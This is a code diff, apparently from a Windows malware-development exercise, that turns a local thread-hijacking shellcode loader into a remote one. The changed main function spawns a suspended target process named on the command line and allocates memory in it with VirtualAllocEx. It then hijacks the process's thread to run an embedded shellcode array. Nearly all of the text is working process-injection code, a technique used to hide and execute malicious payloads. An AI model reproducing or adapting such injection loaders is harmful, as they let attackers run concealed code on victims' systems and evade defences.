@@ -40,30 +40,31 @@ __declspec(allocate(".text")) CONST UCHAR Shellcode[] = {
     0x63,0x2e,0x65,0x78,0x65,0x00
 };
 
-int main() {
+int main(int argc, char* argv[]) {
 
     PrintBanner();
 
-    BOOL   State        = TRUE;
-    PVOID  Buffer       = NULL;
-	HANDLE ThreadHandle = NULL;
+    if (argc < 2) {
+        WARN("usage: \"%s\" [process]", argv[0]);
+        return EXIT_FAILURE;
+    }
 
-    INFO("creating a suspended thread in the local process...");
-	ThreadHandle = CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)&DummyFunction, NULL, CREATE_SUSPENDED, NULL);
-	if (NULL == ThreadHandle) {
-		PRINT_ERROR("CreateThread");
-		return EXIT_FAILURE; /* no point in continuing if we can't even get a handle on the thread */
-	}
-	OKAY("[0x%p] created the thread (%ld)! beginning the hijack...", ThreadHandle, GetThreadId(ThreadHandle));
+    DWORD  PID           = 0;
+    BOOL   State         = TRUE;
+    PVOID  Buffer        = NULL;
+	HANDLE ThreadHandle  = NULL;
+    HANDLE ProcessHandle = NULL;
 
-    Buffer = VirtualAlloc(NULL, sizeof(Shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+    CreateSuspendedProcess(argv[1], &PID, &ProcessHandle, &ThreadHandle);
+
+    Buffer = VirtualAllocEx(ProcessHandle, NULL, sizeof(Shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
     if (NULL == Buffer) {
         PRINT_ERROR("VirtualAlloc");
         State = FALSE; goto CLEANUP;
     }
     OKAY("[0x%p] [RW-] allocated a buffer in memory with PAGE_READWRITE [RW-] permissions!", Buffer);
 
-	if (!LocalThreadHijack(ThreadHandle, Buffer, Shellcode, sizeof(Shellcode))) {
+	if (!RemoteThreadHijack(ThreadHandle, ProcessHandle, Buffer, Shellcode, sizeof(Shellcode))) {
 		WARN("thread hijack failed, exiting...");
         State = FALSE; goto CLEANUP;
 	}
@@ -84,6 +85,11 @@ CLEANUP:
     if (ThreadHandle) {
         CloseHandle(ThreadHandle);
         INFO("[0x%p] closed thread handle", ThreadHandle);
+    }
+
+    if (ProcessHandle) {
+        CloseHandle(ProcessHandle);
+        INFO("[0x%p] closed process handle", ProcessHandle);
     }
 
     return State;
